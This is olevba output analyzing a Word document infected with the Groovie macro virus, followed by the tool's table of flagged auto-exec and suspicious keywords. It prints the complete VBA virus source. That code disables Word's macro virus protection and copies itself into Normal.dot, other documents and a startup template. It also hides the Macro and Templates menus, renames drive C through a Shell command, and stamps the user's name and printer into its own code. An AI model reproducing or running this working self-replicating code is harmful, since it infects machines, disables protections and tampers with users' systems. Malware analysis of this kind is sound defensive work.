olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.g - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
Public I03 As Boolean
 ' O12/22/98 5:35:20 AM728OIT728Xerox Printer on LPT2:
Public I04 As Boolean
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Public I05 As Boolean
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Public I06 As String
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Public I07 As Boolean
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Public I08 As Boolean
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Function I09()
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If MacroContainer = NormalTemplate Then
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        I01 = "normal"
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        GoTo checkout
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    End If
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
checkout:
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
End Function
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Function I10()
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then I04 = True
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    Next I
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then I03 = True
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    Next I
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
End Function
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Function I11()
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Call I09
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Call I10
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If I01 = "document" Then Call I12
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If I01 = "normal" Then Call I13
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If I01 = "orbit" Then Call I14
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
End Function
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Function I12()
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If I03 = False And I05 = False Then
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        With NormalTemplate.VBProject
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        With .VBComponents.Import("c:\groovie.sys")
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        End With
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        End With
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    End If
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If I02 = False Then
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        If I08 = False Then Documents.Open FileName:=I06
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        Shell ("label c: groovie"), 0
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        Windows(1).Close
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    End If
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
End Function
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Function I13()
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Application.ScreenUpdating = False
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    Call I17
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If I04 = False And I07 = True Then
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        With ActiveDocument.VBProject
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        With .VBComponents.Import("c:\groovie.sys")
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        End With
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        End With
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        With Dialogs(wdDialogFileSummaryInfo)
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            .Comments = "ALT-F11 says it's groovie!"
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            .Execute
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        End With
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    End If
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If I02 = False And I07 = True Then
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        If I08 = False Then Documents.Open FileName:=I06
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    End If
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    If I02 = False And I07 = False Then
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        Documents.Add Template:="", NewTemplate:=False
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    End If
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Application.ScreenUpdating = True
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
End Function
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Function I14()
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Application.ScreenUpdating = False
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        If I03 = False And I05 = False Then
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            With NormalTemplate.VBProject
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            With .VBComponents.Import("c:\groovie.sys")
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            End With
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            End With
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            NormalTemplate.Save
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        End If
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        If I04 = False Then
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            With ActiveDocument.VBProject
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            With .VBComponents.Import("c:\groovie.sys")
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            End With
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            End With
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            With Dialogs(wdDialogFileSummaryInfo)
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
                .Comments = "ALT-F11 says it's groovie!"
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
                .Execute
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
            End With
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
        End If
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Application.ScreenUpdating = True
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
End Function
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Function I15()
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    Options.VirusProtection = False
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    Options.SaveNormalPrompt = False
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    Options.ConfirmConversions = False
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    I06 = ActiveDocument.FullName
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
    Call I11
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
End Function
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Sub AutoOpen()
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Call I15
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
End Sub
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Sub AutoClose()
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
I08 = True
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Call I15
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
End Sub
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Sub AutoExit()
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Call I15
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
End Sub
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
Sub FileSaveAs()
 ' O12/22/98 5:35:21 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Call I16
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Call I15
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Dialogs(wdDialogFileSaveAs).Show
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
End Sub
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Sub filesave()
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Call I16
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Call I15
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
End Sub
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Sub fileclose()
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
I08 = True
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Call I15
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
ActiveDocument.Close
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
End Sub
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Sub fileprint()
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
On Error Resume Next
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Call I15
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Dialogs(wdDialogFilePrint).Show
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
End Sub
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Sub ViewVBCode()
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
End Sub
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Sub ToolsMacro()
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
End Sub
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Sub FileTemplates()
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
End Sub
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Function I17()
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
On Error GoTo docek
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
    If ActiveDocument.Name <> "" Then
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
        I07 = True
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
    End If
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
    GoTo over
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
docek:
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
    I07 = False
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
over:
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
End Function
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Function I16()
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Randomize
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
rn = Int(Rnd * 999)
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").codemodule
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
For x = 2 To 358 Step 2
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
.deletelines x
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & rn & Application.ActivePrinter
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
Next x
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
End With
 ' O12/22/98 5:35:22 AM728OIT728Xerox Printer on LPT2:
End Function
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Groovie.g - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

